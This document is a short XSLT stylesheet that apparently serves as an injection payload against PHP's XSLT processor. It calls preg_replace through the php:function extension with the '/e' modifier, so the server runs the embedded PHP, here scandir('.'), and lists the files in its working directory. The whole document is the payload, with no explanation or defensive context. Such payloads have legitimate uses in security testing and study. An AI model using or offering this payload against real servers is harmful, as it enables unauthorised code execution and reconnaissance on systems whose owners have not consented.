<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
<xsl:template match="/">

   <xsl:variable name="scana">
        implode('<br/>',scandir('.'))
</xsl:variable>
<br />Scan dir 1: <xsl:value-of select="php:function('preg_replace', '/.*/e', $scana, '')" />
    
    
</xsl:template>
</xsl:stylesheet>
